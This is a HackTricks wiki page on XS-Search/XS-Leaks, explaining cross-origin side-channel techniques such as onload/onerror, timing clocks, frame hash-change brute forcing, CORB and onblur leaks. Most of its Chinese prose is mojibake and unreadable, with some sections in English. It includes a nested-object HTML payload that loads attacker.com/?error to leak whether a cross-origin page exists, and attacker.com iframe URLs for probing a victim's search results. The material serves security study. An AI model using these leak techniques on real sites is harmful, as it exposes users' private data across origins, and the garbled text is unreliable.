# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ä¸Šå…³æ³¨**æˆ‘ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

XS-Searchæ˜¯ä¸€ç§åˆ©ç”¨**ä¾§ä¿¡é“æ¼æ´**æ¥æå–**è·¨æºä¿¡æ¯**çš„æ–¹æ³•ã€‚

å‚ä¸æ­¤æ”»å‡»çš„å…³é”®ç»„ä»¶åŒ…æ‹¬ï¼š

* **æ˜“å—æ”»å‡»çš„Web**: æ„å›¾æå–ä¿¡æ¯çš„ç›®æ ‡ç½‘ç«™ã€‚
* **æ”»å‡»è€…çš„Web**: æ”»å‡»è€…åˆ›å»ºçš„æ¶æ„ç½‘ç«™ï¼Œå—å®³è€…è®¿é—®è¯¥ç½‘ç«™ï¼Œæ‰˜ç®¡åˆ©ç”¨ç¨‹åºã€‚
* **åŒ…å«æ–¹æ³•**: ç”¨äºå°†æ˜“å—æ”»å‡»çš„Webåˆå¹¶åˆ°æ”»å‡»è€…çš„Webä¸­çš„æŠ€æœ¯ï¼ˆä¾‹å¦‚ï¼Œwindow.openï¼Œiframeï¼Œfetchï¼Œå¸¦æœ‰hrefçš„HTMLæ ‡ç­¾ç­‰ï¼‰ã€‚
* **æ³„æ¼æŠ€æœ¯**: ç”¨äºé€šè¿‡åŒ…å«æ–¹æ³•æ”¶é›†çš„ä¿¡æ¯æ¥åŒºåˆ†æ˜“å—æ”»å‡»çš„WebçŠ¶æ€å·®å¼‚çš„æŠ€æœ¯ã€‚
* **çŠ¶æ€**: æ”»å‡»è€…æ—¨åœ¨åŒºåˆ†æ˜“å—æ”»å‡»çš„Webçš„ä¸¤ç§æ½œåœ¨çŠ¶æ€ã€‚
* **å¯æ£€æµ‹å·®å¼‚**: æ”»å‡»è€…ä¾èµ–äºæ¨æ–­æ˜“å—æ”»å‡»çš„WebçŠ¶æ€çš„å¯è§‚å¯Ÿå˜åŒ–ã€‚

### å¯æ£€æµ‹å·®å¼‚

å¯ä»¥åˆ†æå‡ ä¸ªæ–¹é¢ä»¥åŒºåˆ†æ˜“å—æ”»å‡»çš„Webçš„çŠ¶æ€ï¼š

* **çŠ¶æ€ç **: åŒºåˆ†è·¨æºçš„**å„ç§HTTPå“åº”çŠ¶æ€ç **ï¼Œå¦‚æœåŠ¡å™¨é”™è¯¯ã€å®¢æˆ·ç«¯é”™è¯¯æˆ–èº«ä»½éªŒè¯é”™è¯¯ã€‚
* **APIä½¿ç”¨**: è¯†åˆ«é¡µé¢é—´**Web APIçš„ä½¿ç”¨**ï¼Œæ­ç¤ºè·¨æºé¡µé¢æ˜¯å¦ä½¿ç”¨ç‰¹å®šçš„JavaScript Web APIã€‚
* **é‡å®šå‘**: æ£€æµ‹åˆ°å¯¼èˆªåˆ°ä¸åŒé¡µé¢ï¼Œä¸ä»…ä»…æ˜¯HTTPé‡å®šå‘ï¼Œè¿˜åŒ…æ‹¬ç”±JavaScriptæˆ–HTMLè§¦å‘çš„å¯¼èˆªã€‚
* **é¡µé¢å†…å®¹**: è§‚å¯Ÿ**HTTPå“åº”ä¸»ä½“**æˆ–é¡µé¢å­èµ„æºçš„å˜åŒ–ï¼Œä¾‹å¦‚**åµŒå…¥å¸§çš„æ•°é‡**æˆ–å›¾åƒå¤§å°å·®å¼‚ã€‚
* **HTTPå¤´**: æ³¨æ„ç‰¹å®šHTTPå“åº”å¤´çš„å­˜åœ¨æˆ–å¯èƒ½çš„å€¼ï¼ŒåŒ…æ‹¬è¯¸å¦‚X-Frame-Optionsã€Content-Dispositionå’ŒCross-Origin-Resource-Policyç­‰å¤´ã€‚
* **æ—¶é—´**: æ³¨æ„ä¸¤ç§çŠ¶æ€ä¹‹é—´çš„ä¸€è‡´æ—¶é—´å·®å¼‚ã€‚

### åŒ…å«æ–¹æ³•

* **HTMLå…ƒç´ **: HTMLæä¾›å„ç§å…ƒç´ ç”¨äº**åŒ…å«è·¨æºèµ„æº**ï¼Œå¦‚æ ·å¼è¡¨ã€å›¾åƒæˆ–è„šæœ¬ï¼Œè¿«ä½¿æµè§ˆå™¨è¯·æ±‚éHTMLèµ„æºã€‚å¯åœ¨[https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)æ‰¾åˆ°æ­¤ç›®çš„çš„æ½œåœ¨HTMLå…ƒç´ çš„æ±‡ç¼–ã€‚
* **æ¡†æ¶**: è¯¸å¦‚**iframe**ã€**object**å’Œ**embed**ç­‰å…ƒç´ å¯ä»¥ç›´æ¥å°†HTMLèµ„æºåµŒå…¥åˆ°æ”»å‡»è€…çš„é¡µé¢ä¸­ã€‚å¦‚æœé¡µé¢**ç¼ºä¹æ¡†æ¶ä¿æŠ¤**ï¼ŒJavaScriptå¯ä»¥é€šè¿‡contentWindowå±æ€§è®¿é—®è¢«æ¡†æ¶èµ„æºçš„windowå¯¹è±¡ã€‚
* **å¼¹å‡ºçª—å£**: **`window.open`**æ–¹æ³•åœ¨æ–°æ ‡ç­¾é¡µæˆ–çª—å£ä¸­æ‰“å¼€èµ„æºï¼Œä¸ºJavaScriptæä¾›ä¸€ä¸ªéµå¾ªSOPåä¸æ–¹æ³•å’Œå±æ€§äº¤äº’çš„çª—å£å¥æŸ„ã€‚å¼¹å‡ºçª—å£é€šå¸¸ç”¨äºå•ç‚¹ç™»å½•ï¼Œç»•è¿‡ç›®æ ‡èµ„æºçš„æ¡†æ¶å’Œcookieé™åˆ¶ã€‚ä½†æ˜¯ï¼Œç°ä»£æµè§ˆå™¨é™åˆ¶å¼¹å‡ºçª—å£çš„åˆ›å»ºåˆ°æŸäº›ç”¨æˆ·æ“ä½œã€‚
* **JavaScriptè¯·æ±‚**: JavaScriptå…è®¸ä½¿ç”¨**XMLHttpRequests**æˆ–**Fetch API**ç›´æ¥è¯·æ±‚ç›®æ ‡èµ„æºã€‚è¿™äº›æ–¹æ³•æä¾›å¯¹è¯·æ±‚çš„ç²¾ç¡®æ§åˆ¶ï¼Œä¾‹å¦‚é€‰æ‹©æ˜¯å¦è·ŸéšHTTPé‡å®šå‘ã€‚

### æ³„æ¼æŠ€æœ¯

* **äº‹ä»¶å¤„ç†ç¨‹åº**: åœ¨XS-Leaksä¸­çš„ä¸€ä¸ªç»å…¸æ³„æ¼æŠ€æœ¯ï¼Œäº‹ä»¶å¤„ç†ç¨‹åºå¦‚**onload**å’Œ**onerror**æä¾›æœ‰å…³èµ„æºåŠ è½½æˆåŠŸæˆ–å¤±è´¥çš„ä¿¡æ¯ã€‚
* **é”™è¯¯æ¶ˆæ¯**: JavaScriptå¼‚å¸¸æˆ–ç‰¹æ®Šé”™è¯¯é¡µé¢å¯ä»¥ç›´æ¥ä»é”™è¯¯æ¶ˆæ¯ä¸­æä¾›æ³„æ¼ä¿¡æ¯ï¼Œæˆ–é€šè¿‡åŒºåˆ†é”™è¯¯æ¶ˆæ¯çš„å­˜åœ¨å’Œä¸å­˜åœ¨æ¥æä¾›ä¿¡æ¯ã€‚
* **å…¨å±€é™åˆ¶**: æµè§ˆå™¨çš„ç‰©ç†é™åˆ¶ï¼Œå¦‚å†…å­˜å®¹é‡æˆ–å…¶ä»–å¼ºåˆ¶æ‰§è¡Œçš„æµè§ˆå™¨é™åˆ¶ï¼Œå¯ä»¥åœ¨è¾¾åˆ°é˜ˆå€¼æ—¶å‘å‡ºä¿¡å·ï¼Œä½œä¸ºæ³„æ¼æŠ€æœ¯ã€‚
* **å…¨å±€çŠ¶æ€**: å¯ä»¥åˆ©ç”¨ä¸æµè§ˆå™¨çš„**å…¨å±€çŠ¶æ€**ï¼ˆä¾‹å¦‚Historyæ¥å£ï¼‰çš„å¯æ£€æµ‹äº¤äº’ã€‚ä¾‹å¦‚ï¼Œæµè§ˆå™¨å†å²è®°å½•ä¸­çš„**æ¡ç›®æ•°é‡**å¯ä»¥æä¾›æœ‰å…³è·¨æºé¡µé¢çš„çº¿ç´¢ã€‚
* **æ€§èƒ½API**: æ­¤APIæä¾›å½“å‰é¡µé¢çš„**æ€§èƒ½è¯¦ç»†ä¿¡æ¯**ï¼ŒåŒ…æ‹¬æ–‡æ¡£å’ŒåŠ è½½èµ„æºçš„ç½‘ç»œæ—¶é—´ï¼Œä»è€Œæ¨æ–­è¯·æ±‚çš„èµ„æºã€‚
* **å¯è¯»å±æ€§**: ä¸€äº›HTMLå±æ€§æ˜¯**å¯è·¨æºè¯»å–**çš„ï¼Œå¯ç”¨ä½œæ³„æ¼æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œ`window.frame.length`å±æ€§å…è®¸JavaScriptè®¡ç®—è·¨æºç½‘é¡µä¸­åŒ…å«çš„å¸§æ•°ã€‚

## XSinatorå·¥å…·å’Œè®ºæ–‡

XSinatoræ˜¯ä¸€ä¸ªè‡ªåŠ¨å·¥å…·ï¼Œç”¨äºæ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å—åˆ°å…¶è®ºæ–‡ä¸­è§£é‡Šçš„**å‡ ç§å·²çŸ¥XS-Leaks**çš„å½±å“ï¼š**[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

æ‚¨å¯ä»¥åœ¨[https://xsinator.com/](https://xsinator.com/) **è®¿é—®è¯¥å·¥å…·**

{% hint style="warning" %}
**æ’é™¤çš„XS-Leaks**: æˆ‘ä»¬ä¸å¾—ä¸æ’é™¤ä¾èµ–**æœåŠ¡å·¥ä½œè€…**çš„XS-Leaksï¼Œå› ä¸ºå®ƒä»¬ä¼šå¹²æ‰°XSinatorä¸­çš„å…¶ä»–æ³„æ¼ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬é€‰æ‹©**æ’é™¤ä¾èµ–ç‰¹å®šWebåº”ç”¨ç¨‹åºä¸­çš„é…ç½®é”™è¯¯å’Œæ¼æ´**çš„XS-Leaksã€‚ä¾‹å¦‚ï¼Œè·¨æºèµ„æºå…±äº«ï¼ˆCORSï¼‰é…ç½®é”™è¯¯ã€postMessageæ³„æ¼æˆ–è·¨ç«™è„šæœ¬ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æ’é™¤äº†åŸºäºæ—¶é—´çš„XS-Leaksï¼Œå› ä¸ºå®ƒä»¬ç»å¸¸å—åˆ°é€Ÿåº¦æ…¢ã€å˜ˆæ‚å’Œä¸å‡†ç¡®çš„å½±å“ã€‚
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **åŸºäºæ—¶é—´çš„æŠ€æœ¯**

ä»¥ä¸‹ä¸€äº›æŠ€æœ¯å°†ä½¿ç”¨æ—¶é—´ä½œä¸ºæ£€æµ‹ç½‘é¡µå¯èƒ½çŠ¶æ€å·®å¼‚çš„è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚åœ¨Webæµè§ˆå™¨ä¸­æœ‰ä¸åŒçš„æµ‹é‡æ—¶é—´çš„æ–¹æ³•ã€‚

**æ—¶é’Ÿ**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) APIå…è®¸å¼€å‘äººå‘˜è·å–é«˜åˆ†è¾¨ç‡çš„æ—¶é—´æµ‹é‡ã€‚\
æ”»å‡»è€…å¯ä»¥æ»¥ç”¨å¤§é‡APIæ¥åˆ›å»ºéšå¼æ—¶é’Ÿï¼š[Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API)ã€[Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel)ã€[requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)ã€[setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout)ã€CSSåŠ¨ç”»ç­‰ã€‚\
æ›´å¤šä¿¡æ¯ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/)ã€‚

## äº‹ä»¶å¤„ç†ç¨‹åºæŠ€æœ¯

### Onload/Onerror

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶ã€HTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu)ã€[https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **æ‘˜è¦**: å¦‚æœå°è¯•åœ¨onerror/onloadäº‹ä»¶ä¸­åŠ è½½èµ„æºæ—¶ï¼Œè§¦å‘äº†èµ„æºæˆåŠŸåŠ è½½/åŠ è½½å¤±è´¥çš„äº‹ä»¶ï¼Œå°±å¯ä»¥ç¡®å®šçŠ¶æ€ç ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

ä»£ç ç¤ºä¾‹å°è¯•ä»JSä¸­**åŠ è½½è„šæœ¬å¯¹è±¡**ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨**å…¶ä»–æ ‡ç­¾**ï¼Œå¦‚å¯¹è±¡ã€æ ·å¼è¡¨ã€å›¾åƒã€éŸ³é¢‘ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ç›´æ¥æ³¨å…¥**æ ‡ç­¾**ï¼Œå¹¶åœ¨æ ‡ç­¾å†…éƒ¨å£°æ˜`onload`å’Œ`onerror`äº‹ä»¶ï¼ˆè€Œä¸æ˜¯ä»JSä¸­æ³¨å…¥ï¼‰ã€‚

è¿˜æœ‰ä¸€ä¸ªæ— éœ€è„šæœ¬çš„æ”»å‡»ç‰ˆæœ¬ï¼š
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ`example.com/404`æœªæ‰¾åˆ°ï¼Œå°†åŠ è½½`attacker.com/?error`ã€‚

### Onload Timing

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API**å¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ç„¶è€Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿï¼Œå¦‚[**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming)ï¼Œè¯¥APIå¯è¯†åˆ«è¿è¡Œæ—¶é—´è¶…è¿‡50æ¯«ç§’çš„ä»»åŠ¡ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) å¦ä¸€ä¸ªç¤ºä¾‹åœ¨ï¼š

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

è¿™ç§æŠ€æœ¯ä¸å‰ä¸€ç§ç±»ä¼¼ï¼Œä½†**æ”»å‡»è€…**è¿˜å°†åœ¨**ç­”æ¡ˆä¸ºæ­£æˆ–è´Ÿæ—¶**å¼ºåˆ¶æ‰§è¡ŒæŸäº›æ“ä½œä»¥èŠ±è´¹**ç›¸å…³çš„æ—¶é—´**ï¼Œå¹¶æµ‹é‡è¯¥æ—¶é—´ã€‚

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** å¯ä½¿ç”¨[SharedArrayBufferæ—¶é’Ÿ](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers)æ¥æµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

é€šè¿‡åˆ©ç”¨[`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event)å’Œ[`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event)äº‹ä»¶ï¼Œå¯ä»¥æµ‹é‡è·å–èµ„æºæ‰€éœ€çš„æ—¶é—´ã€‚**`beforeunload`**äº‹ä»¶åœ¨æµè§ˆå™¨å³å°†å¯¼èˆªåˆ°æ–°é¡µé¢æ—¶è§¦å‘ï¼Œè€Œ**`unload`**äº‹ä»¶åœ¨å®é™…å¯¼èˆªå‘ç”Ÿæ—¶è§¦å‘ã€‚å¯ä»¥è®¡ç®—è¿™ä¸¤ä¸ªäº‹ä»¶ä¹‹é—´çš„æ—¶é—´å·®æ¥ç¡®å®šæµè§ˆå™¨è·å–èµ„æºæ‰€èŠ±è´¹çš„æ—¶é—´ã€‚

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) APIå¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

è§‚å¯Ÿåˆ°ï¼Œåœ¨ç¼ºä¹[æ¡†æ¶ä¿æŠ¤](https://xsleaks.dev/docs/defenses/opt-in/xfo/)çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥æµ‹é‡é¡µé¢åŠå…¶å­èµ„æºé€šè¿‡ç½‘ç»œåŠ è½½æ‰€éœ€çš„æ—¶é—´ã€‚è¿™ç§æµ‹é‡é€šå¸¸æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºä»…åœ¨iframeçš„`onload`å¤„ç†ç¨‹åºåœ¨èµ„æºåŠ è½½å’ŒJavaScriptæ‰§è¡Œå®Œæˆåæ‰ä¼šè§¦å‘ã€‚ä¸ºäº†ç»•è¿‡è„šæœ¬æ‰§è¡Œå¼•å…¥çš„å˜åŒ–æ€§ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨`<iframe>`å†…ä½¿ç”¨[`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)å±æ€§ã€‚åŒ…å«æ­¤å±æ€§ä¼šé™åˆ¶è®¸å¤šåŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯JavaScriptçš„æ‰§è¡Œï¼Œä»è€Œä¿ƒè¿›ä¸»è¦å—ç½‘ç»œæ€§èƒ½å½±å“çš„æµ‹é‡ã€‚
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **åŒ…å«æ–¹æ³•**ï¼šFrames
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š
* **æ‘˜è¦**ï¼šå¦‚æœè®¿é—®æ­£ç¡®å†…å®¹æ—¶é¡µé¢å‡ºç°é”™è¯¯ï¼Œå¹¶ä¸”è®¿é—®ä»»ä½•å†…å®¹æ—¶é¡µé¢åŠ è½½æ­£ç¡®ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªå¾ªç¯æ¥æå–æ‰€æœ‰ä¿¡æ¯ï¼Œè€Œæ— éœ€æµ‹é‡æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

å‡è®¾æ‚¨å¯ä»¥**æ’å…¥**åŒ…å«**ç§˜å¯†å†…å®¹**çš„**é¡µé¢**åˆ°**ä¸€ä¸ªiframe**ä¸­ã€‚

æ‚¨å¯ä»¥**è®©å—å®³è€…æœç´¢**åŒ…å«â€œ_**flag**_â€çš„æ–‡ä»¶ï¼Œä½¿ç”¨ä¸€ä¸ª**iframe**ï¼ˆä¾‹å¦‚åˆ©ç”¨CSRFï¼‰ã€‚åœ¨iframeå†…ï¼Œæ‚¨çŸ¥é“**`onload`äº‹ä»¶**å°†**è‡³å°‘æ‰§è¡Œä¸€æ¬¡**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥é€šè¿‡ä»…æ›´æ”¹URLä¸­çš„**å“ˆå¸Œ**å†…å®¹æ¥**æ›´æ”¹iframeçš„URL**ã€‚

ä¾‹å¦‚ï¼š

1. **URL1**ï¼šwww.attacker.com/xssearch#try1
2. **URL2**ï¼šwww.attacker.com/xssearch#try2

å¦‚æœç¬¬ä¸€ä¸ªURL**æˆåŠŸåŠ è½½**ï¼Œé‚£ä¹ˆå½“**æ›´æ”¹**URLçš„**å“ˆå¸Œ**éƒ¨åˆ†æ—¶ï¼Œ**`onload`**äº‹ä»¶å°†**ä¸ä¼šå†æ¬¡è§¦å‘**ã€‚ä½†æ˜¯ï¼Œ**å¦‚æœ**é¡µé¢åœ¨**åŠ è½½**æ—¶å‡ºç°**æŸç§é”™è¯¯**ï¼Œé‚£ä¹ˆ**`onload`**äº‹ä»¶å°†**å†æ¬¡è§¦å‘**ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥**åŒºåˆ†**ä¸€ä¸ª**æ­£ç¡®åŠ è½½**çš„é¡µé¢æˆ–è®¿é—®æ—¶å‡ºç°**é”™è¯¯**çš„é¡µé¢ã€‚

### Javascriptæ‰§è¡Œ

* **åŒ…å«æ–¹æ³•**ï¼šFrames
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š
* **æ‘˜è¦**ï¼šå¦‚æœ**é¡µé¢**è¿”å›**æ•æ„Ÿå†…å®¹**ï¼Œæˆ–è€…ç”¨æˆ·å¯ä»¥**æ§åˆ¶çš„å†…å®¹**ã€‚ç”¨æˆ·å¯ä»¥åœ¨**è´Ÿé¢æƒ…å†µä¸‹**è®¾ç½®**æœ‰æ•ˆçš„JSä»£ç **ï¼Œå¹¶åœ¨**`<script>`**æ ‡ç­¾ä¸­**åŠ è½½**æ¯æ¬¡å°è¯•ï¼Œå› æ­¤åœ¨**è´Ÿé¢**æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…çš„**ä»£ç **ä¼š**æ‰§è¡Œ**ï¼Œè€Œåœ¨**è‚¯å®š**æƒ…å†µä¸‹**ä¸ä¼šæ‰§è¡Œ**ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç å’Œæ ‡å¤´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **æ‘˜è¦**ï¼š**è·¨æºè¯»å–é˜»æ­¢ï¼ˆCORBï¼‰**æ˜¯ä¸€é¡¹å®‰å…¨æªæ–½ï¼Œé˜²æ­¢ç½‘é¡µåŠ è½½æŸäº›æ•æ„Ÿçš„è·¨æºèµ„æºï¼Œä»¥é˜²æ­¢**Spectre**ç­‰æ”»å‡»ã€‚ç„¶è€Œï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…¶ä¿æŠ¤è¡Œä¸ºã€‚å½“å—**CORB**ä¿æŠ¤çš„å“åº”è¿”å›ä¸€ä¸ªå¸¦æœ‰`nosniff`å’Œ`2xx`çŠ¶æ€ç çš„`Content-Type`æ—¶ï¼Œ**CORB**ä¼šå‰¥ç¦»å“åº”çš„ä¸»ä½“å’Œæ ‡å¤´ã€‚è§‚å¯Ÿåˆ°è¿™ä¸€ç‚¹çš„æ”»å‡»è€…å¯ä»¥æ¨æ–­**çŠ¶æ€ç **ï¼ˆæŒ‡ç¤ºæˆåŠŸæˆ–é”™è¯¯ï¼‰å’Œ`Content-Type`ï¼ˆè¡¨ç¤ºæ˜¯å¦å—**CORB**ä¿æŠ¤ï¼‰çš„ç»„åˆï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„ä¿¡æ¯æ³„æ¼ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

æŸ¥çœ‹æ›´å¤šä¿¡æ¯é“¾æ¥ä»¥è·å–æœ‰å…³æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

### onblur

* **åŒ…å«æ–¹æ³•**ï¼šFrames
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **æ‘˜è¦**ï¼šä»idæˆ–nameå±æ€§æ³„æ¼æ•æ„Ÿæ•°æ®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

